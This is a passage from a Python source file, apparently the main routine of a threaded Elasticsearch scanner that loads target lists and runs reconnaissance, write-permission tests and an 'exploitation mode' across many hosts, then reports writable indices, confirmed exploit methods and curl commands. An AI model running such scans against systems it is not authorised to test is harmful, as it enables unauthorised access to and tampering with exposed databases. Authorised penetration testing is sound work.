                line = line.strip()
                if line and not line.startswith('#'):
                    raw_targets.append(line)

        if not raw_targets:
            if not args.no_console:
                print(f"❌ No valid targets found in '{args.file}'")
            return

        targets = detect_protocols_for_targets_advanced(raw_targets, args.username, args.password, timeout=3, silent=args.no_console)

    except FileNotFoundError:
        if not args.no_console:
            print(f"❌ Error: Target file '{args.file}' not found")
        return
    except Exception as e:
        if not args.no_console:
            print(f"❌ Error reading target file: {e}")
        return

    # Initialize progress tracking
    progress_counter["total"] = len(targets)
    progress_counter["completed"] = 0

    if not args.no_console:
        print(f"\n🎯 Loaded {len(targets)} targets from {args.file}")
        print(f"🔧 Using {args.threads} threads with {args.timeout}s timeout")

        if args.write_test_only:
            if args.no_index_limit:
                print("📝 Running in SIMPLE WRITE TEST MODE - comprehensive write/read-only testing for penetration testing reports (NO INDEX LIMIT)")
            else:
                print(f"📝 Running in SIMPLE WRITE TEST MODE - testing up to {args.max_indices} indices per target")
        else:
            print(f"📊 Limited to {args.max_indices} indices per target for performance")

        if args.username:
            print(f"🔐 Authentication: {args.username}:{'*' * len(args.password)}")

        if args.recon_only:
            print("🔍 Running in RECONNAISSANCE MODE - passive index discovery only")
        elif args.exploit_confirm:
            exploit_types_str = ', '.join(args.exploit_types) if args.exploit_types else 'all types'
            print(f"⚡ Running in EXPLOITATION MODE - comprehensive testing ({exploit_types_str})")
        elif not args.write_test_only:
            print("📝 Running in BASIC TESTING MODE - standard write permission testing")
        print("🚀 Starting Elasticsearch scan...\n")

    # Perform scanning with improved threading
    all_results = []
    max_workers = min(args.threads, len(targets))

    if args.write_test_only:
        # Simple write test mode for penetration testing reports
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_target = {
                executor.submit(simple_write_test_all_indices, target, args.username, args.password, args.timeout, args.no_console): target 
                for target in targets
            }

            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    results = future.result()
                    all_results.extend(results)
                except Exception as e:
                    if not args.no_console:
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        print(f"[{timestamp}] ❌ {target}: Thread exception - {str(e)}")
                    all_results.append({"target": target, "status": "error", "message": str(e)})
    else:
        # Regular comprehensive scanning mode
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_target = {
                executor.submit(
                    check_elasticsearch_writable_threadsafe, 
                    target, args.username, args.password, args.timeout, args.max_indices,
                    args.recon_only, args.exploit_confirm, args.exploit_types, args.no_console
                ): target 
                for target in targets
            }

            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    results = future.result()
                    all_results.extend(results)
                except Exception as e:
                    if not args.no_console:
                        update_progress(target, f"❌ Exception - {str(e)}", args.no_console)
                    all_results.append({"target": target, "status": "error", "message": str(e)})

    # Apply deduplication if requested
    if args.dedupe:
        original_count = len(all_results)
        all_results = deduplicate_results(all_results)
        if not args.no_console:
            print(f"\n🔄 Deduplication: {original_count} -> {len(all_results)} results")

    # Generate summary (only if console output enabled)
    if not args.no_console:
        if args.write_test_only:
            writable_results = [r for r in all_results if r.get('status') == 'writable']
            readonly_results = [r for r in all_results if r.get('status') == 'read_only']
            error_results = [r for r in all_results if r.get('status') == 'error']

            print(f"\n📊 SIMPLE WRITE TEST SUMMARY")
            print(f"   Total targets scanned: {len(set([r.get('target') for r in all_results]))}")
            if args.no_index_limit:
                print(f"   Mode: Comprehensive (all indices tested)")
            else:
                print(f"   Max indices tested per target: {args.max_indices}")
            print(f"   Writable indices found: {len(writable_results)}")
            print(f"   Read-only indices: {len(readonly_results)}")
            print(f"   Errors encountered: {len(error_results)}")

            if writable_results:
                print(f"\n🔓 WRITABLE INDICES:")
                for result in writable_results:
                    print(f"   ✅ {result['target']} -> {result['index']}")

            if args.show_read_only and readonly_results:
                print(f"\n🔒 READ-ONLY INDICES (sample):")
                for result in readonly_results[:20]:  # Show first 20
                    print(f"   🔒 {result['target']} -> {result['index']}")
                if len(readonly_results) > 20:
                    print(f"   ... and {len(readonly_results) - 20} more")

        elif args.recon_only:
            accessible_results = [r for r in all_results if r.get('status') == 'accessible']
            error_results = [r for r in all_results if r.get('status') == 'error']

            print(f"\n📊 RECONNAISSANCE SUMMARY")
            print(f"   Total targets scanned: {len(set([r.get('target') for r in all_results]))}")
            print(f"   Accessible indices found: {len(accessible_results)} (limited to {args.max_indices} per target)")
            print(f"   Errors encountered: {len(error_results)}")

            if accessible_results:
                print(f"\n🔍 ACCESSIBLE INDICES (sample):")
                for result in accessible_results[:20]:  # Show first 20
                    print(f"   {result['target']} -> {result['index']}")
                if len(accessible_results) > 20:
                    print(f"   ... and {len(accessible_results) - 20} more")

        else:
            exploit_results = [r for r in all_results if r.get('status') == 'exploit_confirmed']
            writable_results = [r for r in all_results if r.get('status') == 'writable']
            readonly_results = [r for r in all_results if r.get('status') == 'read_only']
            error_results = [r for r in all_results if r.get('status') == 'error']

            print(f"\n📊 SCAN SUMMARY")
            print(f"   Total targets scanned: {len(set([r.get('target') for r in all_results]))}")
            print(f"   Max indices tested per target: {args.max_indices}")
            if args.exploit_confirm:
                print(f"   Exploitation confirmed: {len(exploit_results)}")
            print(f"   Writable indices found: {len(writable_results)}")
            print(f"   Read-only indices: {len(readonly_results)}")
            print(f"   Errors encountered: {len(error_results)}")

            if exploit_results:
                print(f"\n💥 EXPLOITATION CONFIRMED:")
                for result in exploit_results:
                    methods = result.get('exploitation_summary', {}).get('successful_methods', [])
                    methods_str = ', '.join(methods) if methods else 'unknown'
                    print(f"   {result['target']} -> {result['index']} ({methods_str})")

                    if args.show_exploit_data and 'exploitation_results' in result:
                        for exploit_result in result['exploitation_results']:
                            if exploit_result.get('curl_command'):
                                print(f"     curl: {exploit_result['curl_command']}")

            if writable_results:
                print(f"\n🔓 WRITABLE INDICES:")
                for result in writable_results:
                    method_info = f" ({result.get('method', 'unknown')})"
                    print(f"   {result['target']} -> {result['index']}{method_info}")

            if args.show_read_only and readonly_results:
                print(f"\n🔒 READ-ONLY INDICES (sample):")
                for result in readonly_results[:10]:
                    print(f"   {result['target']} -> {result['index']}")
                if len(readonly_results) > 10:
                    print(f"   ... and {len(readonly_results) - 10} more")

    # Save results
    if args.output:
        save_to_json(all_results, args.output, silent=args.no_console)

    if args.csv_output:
        save_to_csv(all_results, args.csv_output, silent=args.no_console)

    if not args.no_console:
        if args.write_test_only:
            mode = "simple write test"
            if args.csv_output:
                print(f"💼 CSV files created for penetration testing report documentation")
        elif args.recon_only:
            mode = "reconnaissance"
        elif args.exploit_confirm:
            mode = "exploitation scan"
        else:
            mode = "basic scan"
        print(f"\n✅ {mode.capitalize()} completed successfully!")

        if not args.write_test_only and args.max_indices < 100:
            print(f"💡 To test more indices per target, use: --max-indices {args.max_indices * 2}")

if __name__ == "__main__":
    main()
